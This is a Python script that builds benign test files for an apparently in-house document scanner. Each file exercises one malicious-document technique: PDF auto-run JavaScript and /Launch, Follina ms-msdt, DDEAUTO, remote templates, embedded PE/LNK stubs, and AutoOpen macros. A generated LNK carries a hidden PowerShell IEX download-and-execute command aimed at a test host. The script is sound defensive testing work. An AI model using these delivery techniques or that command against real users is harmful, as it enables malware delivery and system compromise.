#!/usr/bin/env python3
"""
DocScan test range generator.

Creates BENIGN test documents, one per detection vector, so we can walk every
docscan vector (and a real vendor-family signature) end-to-end. Nothing here has
a working payload — macros only assign inert strings; URLs point to test hosts.

Run:  python3 gen_test_range.py [out_dir]   (default: ./range)
"""
import os, sys, struct, zipfile

OUT = sys.argv[1] if len(sys.argv) > 1 else os.path.join(os.path.dirname(__file__), "range")
os.makedirs(OUT, exist_ok=True)

TEST_URL = "http://malware-test.local:8080"   # benign test host, never resolved

# ---------- minimal OOXML (docx) ----------
CONTENT_TYPES = (
    '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    '<Default Extension="xml" ContentType="application/xml"/>'
    '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
    '</Types>')
ROOT_RELS = (
    '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
    '</Relationships>')
DOC_XML = ('<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
           '<w:body><w:p><w:r><w:t>DocScan benign test document.</w:t></w:r></w:p></w:body></w:document>')

def write_docx(name, extra):
    """extra: dict of {zip_path: bytes}. Adds base OOXML parts + extras."""
    parts = {
        "[Content_Types].xml": CONTENT_TYPES.encode(),
        "_rels/.rels": ROOT_RELS.encode(),
        "word/document.xml": DOC_XML.encode(),
    }
    parts.update(extra)
    p = os.path.join(OUT, name)
    with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED) as z:
        for path, data in parts.items():
            z.writestr(path, data)
    return p

def rels(entries):
    """entries: list of (type_suffix, target, mode)."""
    body = ['<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">']
    for i, (typ, target, mode) in enumerate(entries, 1):
        m = ' TargetMode="%s"' % mode if mode else ''
        body.append('<Relationship Id="r%d" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/%s" Target="%s"%s/>' % (i, typ, target, m))
    body.append('</Relationships>')
    return "".join(body).encode()

# ---------- MS-OVBA (one uncompressed chunk) ----------
def ovba_container(text: bytes) -> bytes:
    n = len(text)
    assert n <= 4096
    header = ((n - 1) & 0x0FFF) | 0x3000   # sig=3, uncompressed (flag bit15=0)
    return b"\x01" + struct.pack("<H", header) + text

# ---------- minimal CFB (v3, 512-byte sectors) with one stream ----------
ENDOFCHAIN = 0xFFFFFFFE
FREESECT   = 0xFFFFFFFF
FATSECT    = 0xFFFFFFFD

def _dir_entry(name, obj_type, start, size):
    e = bytearray(128)
    nb = name.encode("utf-16-le") + b"\x00\x00"
    e[0:len(nb)] = nb
    struct.pack_into("<H", e, 64, len(nb))
    e[66] = obj_type
    e[67] = 1
    struct.pack_into("<i", e, 68, -1)
    struct.pack_into("<i", e, 72, -1)
    struct.pack_into("<i", e, 76, -1)
    struct.pack_into("<i", e, 116, start)
    struct.pack_into("<I", e, 120, size & 0xFFFFFFFF)
    return bytes(e)

def build_cfb(stream: bytes) -> bytes:
    SEC = 512
    data = stream
    if len(data) < 4097:                       # >= mini cutoff -> big sectors
        data += b"\x00" * (4097 - len(data))
    if len(data) % SEC:
        data += b"\x00" * (SEC - len(data) % SEC)
    nsec = len(data) // SEC
    data_start = 2
    last = data_start + nsec - 1

    h = bytearray(512)
    h[0:8] = bytes([0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1])
    struct.pack_into("<H", h, 24, 0x3E)
    struct.pack_into("<H", h, 26, 3)
    struct.pack_into("<H", h, 28, 0xFFFE)
    struct.pack_into("<H", h, 30, 9)     # 512-byte sectors
    struct.pack_into("<H", h, 32, 6)     # 64-byte mini sectors
    struct.pack_into("<I", h, 44, 1)     # num FAT sectors
    struct.pack_into("<i", h, 48, 1)     # first dir sector
    struct.pack_into("<I", h, 56, 4096)  # mini stream cutoff
    struct.pack_into("<i", h, 60, -2)    # first mini FAT = ENDOFCHAIN
    struct.pack_into("<i", h, 68, -2)    # first DIFAT = ENDOFCHAIN
    for i in range(109):
        struct.pack_into("<I", h, 76 + i * 4, 0 if i == 0 else FREESECT)

    fat = [FREESECT] * 128
    fat[0] = FATSECT
    fat[1] = ENDOFCHAIN
    for s in range(data_start, last):
        fat[s] = s + 1
    fat[last] = ENDOFCHAIN
    fatsec = b"".join(struct.pack("<I", x & 0xFFFFFFFF) for x in fat)

    dirsec = (_dir_entry("Root Entry", 5, -2, 0)
              + _dir_entry("Module1", 2, data_start, len(data))
              + bytes(128) + bytes(128))

    return bytes(h) + fatsec + dirsec + data

def vba_project(src_text: str) -> bytes:
    return build_cfb(ovba_container(src_text.encode("latin-1")))

# ---------- generators per vector ----------
def gen():
    created = []

    # 1. RTF \objupdate
    rtf = r"{\rtf1\ansi {\object\objupdate\objemb {\*\objdata 0105}}}"
    open(os.path.join(OUT, "rtf_objupdate.rtf"), "w").write(rtf)
    created.append("rtf_objupdate.rtf")

    # 2. PDF auto-JS (OpenAction + JavaScript + dangerous API)
    pdf = ("%PDF-1.5\n1 0 obj<</OpenAction<</S/JavaScript/JS(app.launchURL('%s'))>>>>endobj\n"
           "trailer<</Root 1 0 R>>\n%%%%EOF" % TEST_URL)
    open(os.path.join(OUT, "pdf_js_auto.pdf"), "w").write(pdf)
    created.append("pdf_js_auto.pdf")

    # 3. PDF /Launch
    pdf2 = "%PDF-1.5\n1 0 obj<</OpenAction<</S/Launch/F(cmd.exe)>>>>endobj\ntrailer<</Root 1 0 R>>\n%%%%EOF"
    open(os.path.join(OUT, "pdf_launch.pdf"), "w").write(pdf2)
    created.append("pdf_launch.pdf")

    # 4. Remote Template (settings.xml.rels external attachedTemplate)
    write_docx("remote_template.docx", {
        "word/_rels/settings.xml.rels": rels([("attachedTemplate", TEST_URL + "/t.dotx", "External")]),
        "word/settings.xml": b'<?xml version="1.0"?><w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"/>',
    })
    created.append("remote_template.docx")

    # 5. Follina / protocol handler (ms-msdt:)
    write_docx("protocol_handler.docx", {
        "word/_rels/document.xml.rels": rels([("oleObject", "ms-msdt:/id PCWDiagnostic /skip force /param TEST", "External")]),
    })
    created.append("protocol_handler.docx")

    # 6. DDEAUTO in document.xml
    dde_doc = ('<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
               '<w:body><w:p><w:fldSimple w:instr=" DDEAUTO c:\\\\Windows\\\\System32\\\\notepad.exe TEST "/></w:p></w:body></w:document>')
    write_docx("dde_auto.docx", {"word/document.xml": dde_doc.encode()})
    created.append("dde_auto.docx")

    # 6b. DDE (not AUTO) with a command -> needs the user to accept the update prompt
    dde_link = dde_doc.replace(" DDEAUTO c:", " DDE c:").replace("notepad.exe TEST", "cmd.exe /c notepad.exe TEST")
    write_docx("dde_link.docx", {"word/document.xml": dde_link.encode()})
    created.append("dde_link.docx")

    # 7. External OLE (MEDIUM)
    write_docx("external_ole.docx", {
        "word/_rels/document.xml.rels": rels([("oleObject", TEST_URL + "/o.bin", "External")]),
    })
    created.append("external_ole.docx")

    # 8. Embedded PE (MZ..PE stub inside embeddings/oleObject1.bin)
    mz = bytearray(0x100)
    mz[0:2] = b"MZ"
    struct.pack_into("<I", mz, 0x3C, 0x80)        # e_lfanew
    mz[0x80:0x84] = b"PE\x00\x00"
    write_docx("embedded_pe.docx", {"word/embeddings/oleObject1.bin": bytes(mz)})
    created.append("embedded_pe.docx")

    # 9. Embedded LNK (LNK signature inside embeddings/oleObject1.bin)
    lnk_sig = bytes([0x4C,0,0,0,0x01,0x14,0x02,0,0,0,0,0,0xC0,0,0,0,0,0,0,0x46])
    write_docx("embedded_lnk.docx", {"word/embeddings/oleObject1.bin": lnk_sig + bytes(64)})
    created.append("embedded_lnk.docx")

    # 10. Malicious LNK (lolbin + url args + obfuscation)
    open(os.path.join(OUT, "lnk_lolbin.lnk"), "wb").write(build_lnk(
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('%s/a.ps1')" % TEST_URL))
    created.append("lnk_lolbin.lnk")

    # 11. Suspicious macro (benign body, inert strings)
    src1 = ('Attribute VB_Name = "Module1"\r\n'
            'Sub AutoOpen()\r\n'
            '    Dim s As String\r\n'
            '    s = "powershell"\r\n'
            '    s = "DownloadFile"\r\n'
            '    s = "CreateObject"\r\n'
            "    ' inert test - no execution\r\n"
            'End Sub\r\n')
    write_docx("macro_suspicious.docm", {"word/vbaProject.bin": vba_project(src1)})
    created.append("macro_suspicious.docm")

    # 12. Vendor-signature macro (triggers gen_macro_ShellExecute_action; inert)
    src2 = ('Attribute VB_Name = "Module1"\r\n'
            'Sub AutoOpen()\r\n'
            '    Dim t As String\r\n'
            '    t = "ShellExecute"\r\n'
            '    t = "GetObject"\r\n'
            '    t = "00A0C91F3880"\r\n'
            '    t = "C08AFD90"\r\n'
            "    ' inert test - no execution\r\n"
            'End Sub\r\n')
    write_docx("vendor_shellexec.docm", {"word/vbaProject.bin": vba_project(src2)})
    created.append("vendor_shellexec.docm")

    return created

# ---------- minimal LNK ----------
def build_lnk(target, args):
    HEADER_SIZE = 0x4C
    flags = 0x02 | 0x20          # HasLinkInfo | HasArguments (ANSI)
    h = bytearray(HEADER_SIZE)
    struct.pack_into("<I", h, 0, HEADER_SIZE)
    # LinkCLSID 00021401-0000-0000-C000-000000000046
    h[4:20] = bytes([0x01,0x14,0x02,0,0,0,0,0,0xC0,0,0,0,0,0,0,0x46])
    struct.pack_into("<I", h, 0x14, flags)

    # LinkInfo: header(28) + LocalBasePath (ANSI, NUL-terminated)
    path = target.encode("latin-1") + b"\x00"
    lbp_off = 28
    li_size = lbp_off + len(path)
    li = bytearray(li_size)
    struct.pack_into("<I", li, 0, li_size)     # LinkInfoSize
    struct.pack_into("<I", li, 4, 28)          # LinkInfoHeaderSize
    struct.pack_into("<I", li, 8, 1)           # flags: VolumeIDAndLocalBasePath
    struct.pack_into("<I", li, 16, lbp_off)    # LocalBasePathOffset
    li[lbp_off:lbp_off + len(path)] = path

    # StringData: COMMAND_LINE_ARGUMENTS (ANSI): 2-byte char count + chars
    a = args.encode("latin-1")
    sd = struct.pack("<H", len(a)) + a

    return bytes(h) + bytes(li) + sd

if __name__ == "__main__":
    files = gen()
    print("created %d test documents in %s:" % (len(files), OUT))
    for f in files:
        print("  " + f)
